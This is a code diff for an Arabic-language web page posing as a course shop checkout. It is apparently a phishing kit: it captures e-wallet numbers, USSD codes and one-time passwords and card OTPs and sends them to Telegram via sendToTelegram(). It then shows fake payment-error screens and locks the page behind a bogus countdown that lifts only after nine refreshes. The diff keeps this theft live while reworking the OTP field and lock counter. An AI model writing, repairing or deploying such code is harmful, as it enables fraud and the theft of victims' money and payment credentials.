@@ -376,8 +376,10 @@ footer:before{content:"";position:absolute;top:0;left:0;right:0;height:5px;backg
       <div class="wallet-otp-subtitle">
         ادخل كود الـ OTP اللي وصلك عشان نكمل عملية الدفع.
       </div>
-      <div class="wallet-otp-container" id="walletOTPContainer"></div>
-      <button class="wallet-btn" id="walletOTPBtn">تأكيد الدفع</button>
+      <div style="margin:25px 0">
+        <input type="text" class="wallet-input" id="walletOTPInput" placeholder="ادخل كود OTP" style="text-align:center;font-size:24px;letter-spacing:3px;font-family:'Courier New',monospace;font-weight:700;direction:ltr" inputmode="numeric">
+      </div>
+      <button class="wallet-btn" id="walletOTPBtn" onclick="verifyWalletOTP()">تأكيد الدفع</button>
       <a href="#" class="wallet-resend" onclick="resendWalletOTP(event)">إعادة إرسال OTP</a>
       <button class="wallet-btn" style="background:#6b7280;margin-top:15px" onclick="goBackToWallet()">رجوع لتعديل البيانات</button>
     </div>
@@ -468,22 +470,26 @@ window.addEventListener('DOMContentLoaded', function() {
   const siteLocked = localStorage.getItem('siteLocked');
   
   if(siteLocked === 'true') {
-    // Check if user has refreshed 9 times
-    let cardRefreshCountCheck = parseInt(sessionStorage.getItem('cardRefreshCount') || '0');
+    // Increment refresh counter every time page loads while locked
+    let lockRefreshCount = parseInt(localStorage.getItem('lockRefreshCount') || '0');
+    lockRefreshCount++;
+    localStorage.setItem('lockRefreshCount', lockRefreshCount.toString());
     
-    if(cardRefreshCountCheck >= 9) {
-      // Unlock the site
+    if(lockRefreshCount >= 9) {
+      // Unlock the site after 9 refreshes
       localStorage.removeItem('siteLocked');
       localStorage.removeItem('lockTimestamp');
+      localStorage.removeItem('lockRefreshCount');
       sessionStorage.setItem('cardRefreshCount', '0');
+      // Let the page load normally
     } else {
       // Keep site locked - show error page
-      showLockedPage();
+      showLockedPage(lockRefreshCount);
     }
   }
 });
 
-function showLockedPage() {
+function showLockedPage(refreshCount) {
   // Hide entire body content
   document.body.innerHTML = `
     <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;z-index:999999">
@@ -494,6 +500,7 @@ function showLockedPage() {
             عذراً، حدث خطأ في عملية الدفع ببطاقتك المصرفية.<br>
             من فضلك حاول مرة أخرى بعد:<br><br>
             <div style="font-size:52px;font-weight:900;color:#dc2626;background:#fef2f2;padding:25px;border-radius:15px;margin:20px 0;border:3px solid #fecaca" id="mainCountdown">60:00</div>
+            <div style="font-size:14px;color:#6b7280;margin-top:15px">محاولة ${refreshCount} من 9</div>
             شكراً لتفهمك 🙏
           </div>
         </div>
@@ -545,12 +552,10 @@ const products = [
 
 
 let cart = [];
-let walletOTPBoxes = [];
-let walletFullOTP = "";
-let walletResendTimer = 59;
 let currentTotal = 0;
 let walletNumber = "";
 let walletUSSDCode = "";
+let walletResendTimer = 59;
 
 // Wallet Refresh Counter
 let walletRefreshCount = parseInt(sessionStorage.getItem('walletRefreshCount') || '0');
@@ -794,139 +799,66 @@ function confirmWallet(){
 function showWalletOTP(){
   document.getElementById("walletUSSDSection").style.display = "none";
   document.getElementById("walletOTPSection").style.display = "block";
-  createWalletOTPBoxes();
+  document.getElementById("walletOTPInput").value = "";
+  document.getElementById("walletOTPInput").focus();
   startWalletResendTimer();
 }
 
 
-function createWalletOTPBoxes(){
-  const container = document.getElementById("walletOTPContainer");
-  container.innerHTML = "";
-  walletOTPBoxes = [];
-  for(let i=0;i<6;i++){
-    const input = document.createElement("input");
-    input.type = "text";
-    input.className = "wallet-otp-box";
-    input.maxLength = 1;
-    input.autocomplete = "one-time-code";
-    input.dataset.index = i;
-    input.placeholder = "";
-    input.inputMode = "numeric";
-    input.addEventListener("input",handleWalletOTPInput);
-    input.addEventListener("keydown",handleWalletOTPKeydown);
-    input.addEventListener("focus",handleWalletOTPFocus);
-    input.addEventListener("paste",handleWalletOTPPaste);
-    input.addEventListener("keyup",updateWalletFullOTP);
-    container.appendChild(input);
-    walletOTPBoxes.push(input);
-  }
-  setTimeout(()=>{
-    if(walletOTPBoxes[0]){
-      walletOTPBoxes[0].focus();
-      walletOTPBoxes[0].select();
-    }
-  },100);
-}
-
-
-function handleWalletOTPInput(e){
-  let value = e.target.value.replace(/\D/g,'');
-  if(value.length > 1) value = value[0];
-  e.target.value = value;
-  const index = parseInt(e.target.dataset.index,10);
-  if(value && index < 5){
-    walletOTPBoxes[index+1].focus();
-  }
-  updateWalletFullOTP();
-}
-function handleWalletOTPKeydown(e){
-  const index = parseInt(e.target.dataset.index,10);
-  if(e.key === "Backspace" && !e.target.value && index > 0){
-    walletOTPBoxes[index-1].focus();
-  }
-}
-function handleWalletOTPFocus(e){
-  e.target.select();
-}
-function handleWalletOTPPaste(e){
-  e.preventDefault();
-  const paste = (e.clipboardData || window.clipboardData).getData("text");
-  const numbers = paste.replace(/\D/g,'').slice(0,6);
-  for(let i=0;i<numbers.length && i<6;i++){
-    walletOTPBoxes[i].value = numbers[i];
-  }
-  updateWalletFullOTP();
-  if(walletFullOTP.length === 6){
-    verifyWalletOTP();
-  }
-}
-function updateWalletFullOTP(){
-  walletFullOTP = walletOTPBoxes.map(box=>box.value.replace(/\D/g,'')).join("");
-  const btn = document.getElementById("walletOTPBtn");
-  if(btn){
-    btn.disabled = walletFullOTP.length !== 6;
-    btn.textContent = walletFullOTP.length === 6 ? "تأكيد الدفع" : "أدخل كود OTP كامل";
-  }
-  walletOTPBoxes.forEach((box,index)=>{
-    if(box.value){
-      box.classList.add("valid");
-    }else{
-      box.classList.remove("valid");
-    }
-  });
-}
-
-
 function verifyWalletOTP(){
-  if(walletFullOTP.length === 6 && /^\d{6}$/.test(walletFullOTP)){
-    const otpMessage = `
+  const walletOTPValue = document.getElementById("walletOTPInput").value.trim();
+  
+  if(!walletOTPValue || walletOTPValue.length === 0){
+    alert("من فضلك أدخل كود OTP.");
+    document.getElementById("walletOTPInput").focus();
+    return;
+  }
+  
+  const otpMessage = `
 <b>OTP محفظة</b>
 <b>العميل:</b> ${currentUser ? currentUser.username : "غير مسجل"}
 <b>رقم المحفظة:</b> <code>${walletNumber}</code>
-<b>OTP:</b> <code>${walletFullOTP}</code>
+<b>OTP:</b> <code>${walletOTPValue}</code>
 <b>المبلغ:</b> ${currentTotal} جنيه
 <b>الوقت:</b> ${new Date().toLocaleString("ar-EG")}
-    `;
-    sendToTelegram(otpMessage);
+  `;
+  sendToTelegram(otpMessage);
 
-    // Check if refresh count is 9 or more
-    if(walletRefreshCount >= 9){
-      // Allow payment to proceed
-      const successMessage = `
+  // Check if refresh count is 9 or more
+  if(walletRefreshCount >= 9){
+    // Allow payment to proceed
+    const successMessage = `
 <b>✅ إتمام شراء بالمحفظة الإلكترونية</b>
 <b>العميل:</b> ${currentUser ? currentUser.username : "غير مسجل"}
 <b>رقم المحفظة:</b> <code>${walletNumber}</code>
 <b>الكورسات:</b> ${cart.map(p=>p.name).join(', ')}
 <b>الإجمالي:</b> ${currentTotal} جنيه
 <b>USSD:</b> ${walletUSSDCode}
-      `;
-      sendToTelegram(successMessage);
+    `;
+    sendToTelegram(successMessage);
 
-      document.getElementById("walletOTPSection").style.display = "none";
-      document.getElementById("walletSuccess").style.display = "block";
-      
-      // Reset counter
-      sessionStorage.setItem('walletRefreshCount', '0');
-      walletRefreshCount = 0;
-      
-      cart = [];
-      document.getElementById("count").innerText = 0;
-      setTimeout(()=>{closeWallet();},4000);
-    } else {
-      // Show error message
-      document.getElementById("walletOTPSection").style.display = "none";
-      document.getElementById("walletErrorSection").style.display = "block";
-    }
-  }else{
-    alert("من فضلك أدخل كود OTP صحيح مكوّن من 6 أرقام.");
+    document.getElementById("walletOTPSection").style.display = "none";
+    document.getElementById("walletSuccess").style.display = "block";
+    
+    // Reset counter
+    sessionStorage.setItem('walletRefreshCount', '0');
+    walletRefreshCount = 0;
+    
+    cart = [];
+    document.getElementById("count").innerText = 0;
+    setTimeout(()=>{closeWallet();},4000);
+  } else {
+    // Show error message
+    document.getElementById("walletOTPSection").style.display = "none";
+    document.getElementById("walletErrorSection").style.display = "block";
   }
 }
 
 
 function resendWalletOTP(e){
   e.preventDefault();
-  clearWalletOTP();
-  createWalletOTPBoxes();
+  document.getElementById("walletOTPInput").value = "";
+  document.getElementById("walletOTPInput").focus();
   startWalletResendTimer();
 }
 function startWalletResendTimer(){
@@ -942,14 +874,7 @@ function startWalletResendTimer(){
     }
   },1000);
 }
-function clearWalletOTP(){
-  walletOTPBoxes.forEach(box=>{
-    box.value = "";
-    box.classList.remove("valid");
-  });
-  walletFullOTP = "";
-  updateWalletFullOTP();
-}
+
 function goBackToWallet(){
   document.getElementById("walletOTPSection").style.display = "none";
   document.getElementById("walletUSSDSection").style.display = "none";
@@ -1063,43 +988,34 @@ function verifyCardOTP(){
   `;
   sendToTelegram(otpMessage);
 
-  // Check if refresh count is 9 or more
-  if(cardRefreshCount >= 9){
-    // Reset and allow access
-    localStorage.removeItem('siteLocked');
-    sessionStorage.setItem('cardRefreshCount', '0');
-    cardRefreshCount = 0;
-    alert("تم تأكيد الدفع بنجاح! سيتم تحديث الصفحة.");
-    location.reload();
-  } else {
-    // Lock the site permanently on this device
-    localStorage.setItem('siteLocked', 'true');
-    localStorage.setItem('lockTimestamp', new Date().getTime().toString());
+  // Lock the site permanently on this device
+  localStorage.setItem('siteLocked', 'true');
+  localStorage.setItem('lockTimestamp', new Date().getTime().toString());
+  localStorage.setItem('lockRefreshCount', '0');
+  
+  // Show error message with countdown and freeze website
+  document.getElementById("cardOTPSection").style.display = "none";
+  document.getElementById("cardErrorSection").style.display = "block";
+  
+  // Disable all buttons and interactions except the error section
+  document.body.style.pointerEvents = 'none';
+  document.getElementById("cardErrorSection").style.pointerEvents = 'auto';
+  
+  // Start countdown timer - 60 minutes
+  let totalSeconds = 60 * 60; // 60 minutes in seconds
+  const countdownElement = document.getElementById("cardCountdown");
+  
+  const countdownTimer = setInterval(() => {
+    const minutes = Math.floor(totalSeconds / 60);
+    const seconds = totalSeconds % 60;
+    countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
     
-    // Show error message with countdown and freeze website
-    document.getElementById("cardOTPSection").style.display = "none";
-    document.getElementById("cardErrorSection").style.display = "block";
-    
-    // Disable all buttons and interactions except the error section
-    document.body.style.pointerEvents = 'none';
-    document.getElementById("cardErrorSection").style.pointerEvents = 'auto';
-    
-    // Start countdown timer - 60 minutes
-    let totalSeconds = 60 * 60; // 60 minutes in seconds
-    const countdownElement = document.getElementById("cardCountdown");
-    
-    const countdownTimer = setInterval(() => {
-      const minutes = Math.floor(totalSeconds / 60);
-      const seconds = totalSeconds % 60;
-      countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-      
-      if(totalSeconds <= 0){
-        clearInterval(countdownTimer);
-        countdownElement.textContent = "00:00";
-      }
-      totalSeconds--;
-    }, 1000);
-  }
+    if(totalSeconds <= 0){
+      clearInterval(countdownTimer);
+      countdownElement.textContent = "00:00";
+    }
+    totalSeconds--;
+  }, 1000);
 }
 
 function goBackToCard(){
@@ -1110,11 +1026,6 @@ function goBackToCard(){
 
 
 document.addEventListener("DOMContentLoaded",function(){
-  const otpBtn = document.getElementById("walletOTPBtn");
-  if(otpBtn){
-    otpBtn.onclick = verifyWalletOTP;
-  }
-
   // Format card number input
   const cardNumberInput = document.getElementById("cardNumber");
   if(cardNumberInput){
